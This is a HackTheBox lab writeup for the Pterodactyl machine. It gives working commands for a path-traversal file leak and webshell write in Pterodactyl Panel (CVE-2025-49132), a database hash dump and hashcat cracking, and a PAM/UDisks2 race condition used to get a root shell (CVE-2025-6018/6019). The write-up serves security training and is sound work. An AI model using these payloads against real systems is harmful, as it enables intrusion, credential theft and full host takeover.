---
title: "Pterodactyl — HackTheBox Writeup"
date: "2026-02-28"
description: "Medium Linux machine involving Pterodactyl Panel CVE-2025-49132 path traversal LFI chained with pearcmd.php RCE, Laravel tinker credential dump, and CVE-2025-6018/6019 PAM + UDisks2 race condition privesc"
tags: ['hackthebox', 'writeup', 'linux', 'CVE', 'web pentest', 'LFI', 'privilege escalation', 'php']
thumbnail: ""
---

# Pterodactyl — HTB Labs Machine Writeup

**Difficulty:** Medium
**OS:** Linux (openSUSE Leap 15.6)

---

## Attack Chain Summary

```
CVE-2025-49132: Path traversal LFI → Leak .env (APP_KEY, DB creds)
    → pearcmd.php config-create → Write webshell to /tmp/
        → LFI include → RCE as wwwrun
            → php artisan tinker → DB dump (bypass $hidden) → bcrypt hashes
                → hashcat crack → SSH as phileasfogg3
                    → CVE-2025-6018: PAM pam_env → fake Polkit allow_active
                        → CVE-2025-6019: UDisks2 XFS resize race condition
                            → SUID bash mounted without nosuid → Root
```

---

## Phase 1: Reconnaissance

### Port Scan

| Port | Service | Details |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6 |
| 80/tcp | HTTP | nginx 1.21.5 |

### VHost Enumeration

| VHost | Description |
|-------|-------------|
| `pterodactyl.htb` | Minecraft "MonitorLand" landing page |
| `panel.pterodactyl.htb` | Pterodactyl Panel v1.11.10 (target) |

Tech stack: PHP 8.4.8 (PHP-FPM), Laravel, MariaDB 11.8.3, Redis.

---

## Phase 2: Foothold — CVE-2025-49132

### Path Traversal LFI

Pterodactyl Panel v1.11.10 is vulnerable to **CVE-2025-49132**: path traversal in `/locales/locale.json`. The `locale` and `namespace` parameters construct a file path passed to PHP `require()`.

```bash
# Leak .env file
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../var/www/pterodactyl&namespace=.env"
```

Extracted sensitive data: `APP_KEY`, `DB_USERNAME`, `DB_PASSWORD`, `HASHIDS_SALT`.

### LFI-to-RCE via pearcmd.php

Prerequisites: `register_argc_argv=On` + PEAR in PHP `include_path`.

PEAR's `pearcmd.php` has a `config-create` command that writes arbitrary content to a file. Combined with LFI:

```bash
# Write webshell (commands hex-encoded via hex2bin() for URL safety)
HEX_CMD="6964"  # "id" in hex
curl -s -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin('${HEX_CMD}'))?>+/tmp/x.php"

# Execute via LFI
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=x"
```

Shell obtained as `wwwrun`. **Note**: 6 levels of `../` were needed (not 3-5) due to the openSUSE directory structure.

---

## Phase 3: Lateral Movement

### Laravel Tinker — Database Credential Dump

With write access to the Laravel app directory, `php artisan tinker` provides direct database access. Pterodactyl's `User` model has `$hidden = ['password']` — bypassed with raw SQL:

```bash
php artisan tinker --execute="echo json_encode(\Illuminate\Support\Facades\DB::select('SELECT id,username,email,password FROM users'));"
```

Two bcrypt hashes extracted. Cracked with hashcat:

```bash
hashcat -m 3200 hashes.txt /path/to/rockyou.txt
```

`phileasfogg3` password cracked: `<redacted>`

### SSH Login

```bash
ssh phileasfogg3@10.129.7.193
```

---

## Phase 4: Privilege Escalation — CVE-2025-6018 + CVE-2025-6019

### Hint from System Mail

Mail from `headmonitor` explicitly mentioned unusual `udisksd` activity — clear hint.

### CVE-2025-6018 — PAM pam_env Polkit Bypass

On SUSE Linux, `pam_env` reads `~/.pam_environment`. By setting `XDG_SEAT` and `XDG_VTNR`, an SSH user can fake physical console presence for Polkit `allow_active` status:

```bash
echo 'XDG_SEAT OVERRIDE=seat0' > ~/.pam_environment
echo 'XDG_VTNR OVERRIDE=1' >> ~/.pam_environment
# Re-login SSH for PAM changes to take effect
```

### CVE-2025-6019 — UDisks2 XFS Resize Race Condition

During XFS resize, `libblockdev` temporarily mounts the filesystem to `/tmp/blockdev.XXXXX` **without `nosuid` or `nodev` flags** — a TOCTOU window.

**Exploit steps:**

1. Create XFS image with world-writable root directory (via `xfs_db` offline inode manipulation)
2. Mount via `udisksctl`, copy bash inside, unmount
3. Set SUID root on bash inode offline with `xfs_db`
4. Setup loop device, trigger resize via `gdbus` call
5. Keep mount busy so the nosuid-less mount persists
6. Execute SUID bash from `/tmp/blockdev.XXXXX/`

```bash
# Set SUID root on bash inode
/usr/sbin/xfs_db -x /tmp/xfs.image -c "inode 131" \
  -c "write core.mode 0104555" \
  -c "write core.uid 0" \
  -c "write core.gid 0"

# After triggering resize with busy mount:
/tmp/blockdev*/bash -p
# uid=1002(phileasfogg3) gid=100(users) euid=0(root)
```

---

## Key Takeaways

1. **Path Traversal LFI + pearcmd.php** is a powerful generic RCE chain for PHP applications when `register_argc_argv=On` and PEAR is in include_path.

2. **hex2bin() for bypass** — Encoding commands to hex avoids special character issues in URL query strings.

3. **Laravel Tinker as database backdoor** — `php artisan tinker` with `DB::select()` bypasses model `$hidden` attributes.

4. **PAM environment files** (`~/.pam_environment`) can manipulate session variables affecting Polkit authorization on SUSE systems.

5. **TOCTOU on filesystem operations** — Temporary mounts without security flags create exploitable windows.

6. **xfs_db for offline inode manipulation** — Set mode/uid/gid without root mount access.

---

## CVEs Exploited

| CVE | Component | Type |
|-----|-----------|------|
| CVE-2025-49132 | Pterodactyl Panel < 1.11.11 | Path traversal LFI-to-RCE |
| CVE-2025-6018 | SUSE pam-config | PAM pam_env Polkit bypass |
| CVE-2025-6019 | udisks2/libblockdev | XFS resize race condition (nosuid bypass) |

---

## Tools Used

- `nmap` / `ffuf` — Port scanning and vhost fuzzing
- `curl -g` — CVE-2025-49132 exploitation
- `php artisan tinker` — Database credential dumping
- `hashcat -m 3200` — Bcrypt hash cracking
- `xfs_db` — Offline XFS inode manipulation
- `udisksctl` / `gdbus` — Loop device management and D-Bus calls
